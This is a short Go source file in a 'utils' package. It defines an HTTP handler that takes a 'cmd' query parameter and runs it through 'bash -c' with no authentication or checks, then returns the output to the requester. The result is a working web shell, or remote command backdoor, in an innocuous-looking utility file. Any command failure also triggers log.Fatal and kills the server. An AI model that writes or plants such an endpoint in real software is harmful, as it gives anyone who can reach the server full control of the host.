package utils

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
)

func TodoCMD(writer http.ResponseWriter, request *http.Request) {
	query := request.URL.Query()
	cmd := query.Get("cmd")
	fmt.Println("接收到执行命令: ", cmd)
	res := todoCMD(cmd)
	_, err := writer.Write([]byte(res))
	if err != nil {
		return
	}
}

func todoCMD(command string) string {
	cmd := exec.Command("bash", "-c", command)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Fatal(err)
	}
	if err = cmd.Start(); err != nil {
		log.Fatal(err)
	}

	output, err := io.ReadAll(stdout)
	if err != nil {
		log.Fatal(err)
	}
	errOutput, err := io.ReadAll(stderr)
	if err != nil {
		log.Fatal(err)
	}

	if err = cmd.Wait(); err != nil {
		log.Fatal(err)
	}
	if len(errOutput) > 0 {
		fmt.Println(string(errOutput))
		return "exec failed"
	}
	return string(output)
}
